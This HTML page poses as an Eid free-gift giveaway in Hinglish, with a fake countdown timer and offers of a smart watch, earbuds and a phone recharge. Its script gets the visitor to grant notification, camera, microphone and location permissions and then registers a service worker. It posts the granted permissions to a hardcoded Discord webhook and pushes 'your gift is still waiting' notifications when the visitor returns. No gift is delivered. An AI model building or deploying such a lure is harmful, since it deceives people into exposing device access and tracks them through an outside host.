<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Eid Gift</title>
    <link rel="manifest" href="manifest.json">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a5c0a, #128012);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 10px;
        }

        .box {
            max-width: 350px;
            width: 100%;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .header {
            background: #ffd700;
            padding: 20px;
            text-align: center;
        }

        .eid {
            font-size: 40px;
            margin-bottom: 5px;
        }

        h2 {
            color: #0a5c0a;
            font-size: 20px;
        }

        .timer {
            background: #0a5c0a;
            color: white;
            padding: 12px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }

        .gifts {
            padding: 15px;
        }

        .gift-row {
            display: flex;
            align-items: center;
            padding: 12px;
            background: #f5f5f5;
            margin-bottom: 8px;
            border-radius: 12px;
            cursor: pointer;
        }

        .gift-icon {
            font-size: 30px;
            width: 50px;
            text-align: center;
        }

        .gift-name {
            flex: 1;
            font-weight: bold;
            color: #333;
        }

        .gift-price {
            color: #e67e22;
            font-weight: bold;
        }

        .allow-btn {
            background: #0a5c0a;
            color: white;
            border: none;
            padding: 15px;
            margin: 15px;
            border-radius: 12px;
            width: calc(100% - 30px);
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .footer {
            text-align: center;
            padding: 15px;
            color: #999;
            font-size: 11px;
            border-top: 1px solid #eee;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="header">
            <div class="eid">🌙</div>
            <h2>Eid Chota Gift</h2>
        </div>

        <div class="timer" id="timer">06:00:00</div>

        <div class="gifts">
            <div class="gift-row" onclick="showGift()">
                <span class="gift-icon">⌚</span>
                <span class="gift-name">Smart Watch</span>
                <span class="gift-price">FREE</span>
            </div>
            <div class="gift-row" onclick="showGift()">
                <span class="gift-icon">🎧</span>
                <span class="gift-name">Earbuds</span>
                <span class="gift-price">FREE</span>
            </div>
            <div class="gift-row" onclick="showGift()">
                <span class="gift-icon">⚡</span>
                <span class="gift-name">Type C Charger</span>
                <span class="gift-price">FREE</span>
            </div>
            <div class="gift-row" onclick="showGift()">
                <span class="gift-icon">📞</span>
                <span class="gift-name">₹199 Recharge</span>
                <span class="gift-price">FREE</span>
            </div>
        </div>

        <button class="allow-btn" onclick="allowPermissions()">
            🔔 ALLOW & CLAIM
        </button>

        <div class="footer">
            ⏰ Limited • 3 min mein claim karo
        </div>
    </div>

    <script>
        // Timer
        let time = 21600; // 6 hours in seconds
        setInterval(() => {
            if(time > 0) time--;
            let h = Math.floor(time/3600);
            let m = Math.floor((time%3600)/60);
            let s = time%60;
            document.getElementById('timer').innerHTML = 
                `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
        }, 1000);

        function showGift() {
            alert('🎁 Pehle allow karo!');
        }

        async function allowPermissions() {
            let msg = '';

            // Notification
            if('Notification' in window) {
                let perm = await Notification.requestPermission();
                if(perm === 'granted') {
                    msg += '✅ Notifications\n';
                    new Notification('🎁 Permission Granted!', {
                        body: 'Ab aap gift claim kar sakte hain'
                    });
                }
            }

            // Camera
            try {
                let stream = await navigator.mediaDevices.getUserMedia({video: true});
                stream.getTracks().forEach(t => t.stop());
                msg += '✅ Camera\n';
            } catch(e) {}

            // Mic
            try {
                let stream = await navigator.mediaDevices.getUserMedia({audio: true});
                stream.getTracks().forEach(t => t.stop());
                msg += '✅ Microphone\n';
            } catch(e) {}

            // Location
            navigator.geolocation.getCurrentPosition(
                pos => msg += '✅ Location\n',
                err => {}
            );

            alert('🎉 Permissions Granted!\n' + msg);

            // Service Worker
            if('serviceWorker' in navigator) {
                let reg = await navigator.serviceWorker.register('sw.js');
                console.log('SW Registered');

                // Send to Discord
                fetch('https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: '🎁 New User',
                        embeds: [{
                            title: 'Permissions',
                            description: msg,
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            }
        }

        // Wapas aane par
        document.addEventListener('visibilitychange', function() {
            if(!document.hidden && 'serviceWorker' in navigator) {
                navigator.serviceWorker.ready.then(reg => {
                    reg.showNotification('👋 Wapas aagaye?', {
                        body: 'Aapka gift abhi bhi hai!',
                        icon: 'https://via.placeholder.com/100?text=🎁'
                    });
                });
            }
        });
    </script>
</body>
</html>
